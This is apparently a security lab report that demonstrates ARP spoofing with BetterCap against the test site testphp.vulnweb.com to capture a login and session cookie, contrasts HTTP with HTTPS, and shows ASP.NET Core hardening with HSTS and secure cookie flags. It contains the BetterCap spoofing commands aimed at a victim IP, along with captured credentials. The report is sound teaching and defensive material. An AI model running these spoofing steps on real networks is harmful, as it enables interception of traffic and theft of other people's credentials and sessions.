# CS-005 — Session Hijacking & Cookie Theft
### ARP Spoofing with BetterCap · HTTP vs HTTPS Analysis

---

## Overview

| Field | Detail |
|-------|--------|
| **Target** | `testphp.vulnweb.com` (public vulnerable test site) |
| **Category** | Session Hijacking / Cookie Theft (OWASP A07:2021) |
| **Severity** | High |
| **Attack Method** | ARP Spoofing → Man-in-the-Middle → Cookie Capture |
| **Tools** | BetterCap v2.41.5, Kali Linux (bridged network) |
| **Prevention Demo** | ASP.NET Core — HTTPS, HSTS, HttpOnly, Secure, SameSite |

---

## Objective

Demonstrate the full cookie hijacking attack chain using ARP Spoofing in a controlled bridged lab environment. Contrast the results against HTTPS-protected traffic, and document implementation of all relevant cookie security flags and protocol hardening measures.

---

## Background — Session Hijacking

**Cookie Hijacking** is an attack where an adversary steals a victim's session cookie — the credential token issued by a server after a successful login — and replays it to impersonate the authenticated user.

**The stolen session enables:**
- Full navigation as the victim
- Performing transactions or purchases
- Accessing sensitive account data
- In privileged accounts: reading/modifying system configs, exfiltrating database data, deploying malware

**Attack prerequisites:**
1. Ability to intercept network traffic (same network, ARP Spoofing, rogue AP, etc.)
2. Target application transmitting cookies over unencrypted HTTP
3. Cookies lacking `HttpOnly`, `Secure`, or `SameSite` flags

---

## Vulnerability Analysis

### 2.1 Unencrypted Protocol (HTTP)

The target (`testphp.vulnweb.com`) uses **HTTP** — all traffic between client and server is transmitted in plain text. ARP Spoofing positions the attacker's machine as the network gateway, causing all victim traffic to route through the attacker.

**ARP Spoofing Setup in BetterCap:**
```bash
# Start BetterCap
sudo bettercap

# Identify targets on the network
net.recon on

# Enable HTTP proxy (SSL stripping disabled for pure HTTP capture)
set http.proxy.sslstrip false
http.proxy on

# Set ARP spoofing target (victim machine IP)
set arp.spoof.targets 192.168.0.11

# Start spoofing
arp.spoof on
```

<img width="600" height="517" alt="image" src="https://github.com/user-attachments/assets/6fb50035-31bf-4860-b6d5-380ce72209ea" />
<img width="600" height="662" alt="image" src="https://github.com/user-attachments/assets/9465f851-2607-4a3e-a309-db58e38bff37" />


### 2.2 Insecure Cookie Configuration

The captured cookie from `testphp.vulnweb.com`:
```
Set-Cookie: login=test%2Ftest
```

**Missing security flags:**
| Flag |  Risk Without It |
|------|----------------|
| `Secure` |  Cookie sent over HTTP — interceptable |
| `HttpOnly` |  Cookie accessible via JavaScript — XSS theft possible |
| `SameSite` |  Cookie sent on cross-site requests — CSRF possible |

---

## Exploitation

### HTTP Sniffing — Full Credential & Cookie Capture

**Victim action:** Logged into `http://testphp.vulnweb.com/login.php`

**BetterCap captured the full POST request:**
```http
POST /userinfo.php HTTP/1.1
Host: testphp.vulnweb.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Cookie: login=test%2Ftest
Referer: http://testphp.vulnweb.com/login.php
Accept-Language: en-US,en;q=0.9
...

uname=test&pass=test
```

**Extracted credentials:**
```
Cookie   : login=test%2Ftest
Username : test
Password : test
```

**Risk escalation if this were a privileged account:**
- Cookie replay → full account takeover
- If admin cookie captured → configuration access, data exfiltration
- Repeated polling → persistent surveillance of all victim traffic
- Modify in-flight HTTP responses → serve malicious content to victim

---

### HTTPS Comparison — No Data Captured

**Victim action:** Logged into `https://dribbble.com` (HTTPS-protected)

**BetterCap output during HTTPS session:**
```
[INFO] arp.spoof started, probing 1 targets.
[INFO] endpoint 192.168.0.3 detected
...
(No HTTP request data captured — all traffic encrypted)
```

**Result:** Zero credential or cookie data extracted. TLS encryption prevents the MITM from reading any payload even with traffic interception active.

---

## Prevention Techniques

### 3.1 HTTPS / TLS

Encrypts all traffic between client and server. Even with ARP Spoofing active, the attacker sees only ciphertext.

**ASP.NET Core Implementation (`appsettings.json`):**
```json
{
  "Kestrel": {
    "Endpoints": {
      "Https": {
        "Url": "https://shofwan-shiddiq.com",
        "Certificate": {
          "Path": "certificate.pfx",
          "Password": "your-cert-password"
        }
      }
    }
  }
}
```

---

### 3.2 HTTP Strict Transport Security (HSTS)

Forces browsers to always use HTTPS — prevents attackers from downgrading connections to HTTP.

**ASP.NET Core Implementation (`Program.cs`):**
```csharp
var builder = WebApplication.CreateBuilder(args);

builder.Services.AddHttpsRedirection(options =>
{
    options.RedirectStatusCode = StatusCodes.Status308PermanentRedirect;
    options.HttpsPort = 443;
});

var app = builder.Build();

app.UseHttpsRedirection(); // Redirect all HTTP → HTTPS
app.UseHsts();             // Enforce HTTPS via browser header
```

---

### 3.3 Secure Cookie Flags

**`Secure` Flag:** Cookie only transmitted over HTTPS connections  
**`HttpOnly` Flag:** Cookie inaccessible to JavaScript — prevents XSS-based theft  
**`SameSite=Strict` Flag:** Cookie not sent with cross-site requests — prevents CSRF  

**ASP.NET Core Implementation (`Program.cs`):**
```csharp
builder.Services.ConfigureApplicationCookie(options =>
{
    options.Cookie.HttpOnly    = true;                          // Block JS access
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;   // HTTPS only
    options.Cookie.SameSite    = SameSiteMode.Strict;          // Block cross-site
});
```

**Result — Secured cookie header:**
```
Set-Cookie: .AspNetCore.Session=<value>;
  path=/; httponly; secure; samesite=strict
```

---

### 3.4 Additional Session Controls

| Control | Implementation | Prevents |
|---------|---------------|----------|
| **Session Expiry** | Short TTL + idle timeout | Long-lived token replay |
| **Session Regeneration** | New session ID after login | Session fixation attacks |
| **IP Binding** | Validate session against originating IP | Token replay from different location |
| **Re-authentication** | Require password for sensitive actions | Session riding after theft |

---


---

## Conclusion

1. HTTP is completely transparent to a MITM attacker.** Username, password, and session cookies were captured in a single login — no special tools required beyond ARP Spoofing and a basic proxy.
2. HTTPS is the single most impactful control.** Enabling TLS made the same ARP Spoofing attack produce zero useful data. The cost-to-benefit ratio is unmatched.
3. Cookie flags are cheap and high-value.** Adding `HttpOnly; Secure; SameSite=Strict` to a cookie is a few lines of configuration — yet blocks multiple distinct attack classes.
4. All controls are necessary.** HTTPS alone doesn't stop XSS cookie theft (needs HttpOnly). HttpOnly alone doesn't stop network sniffing (needs HTTPS + Secure). Defense in depth means stacking all layers.
5. ARP Spoofing is viable on any shared network.** Coffee shop, hotel, corporate LAN — any network where the attacker can join puts HTTP sessions at risk.


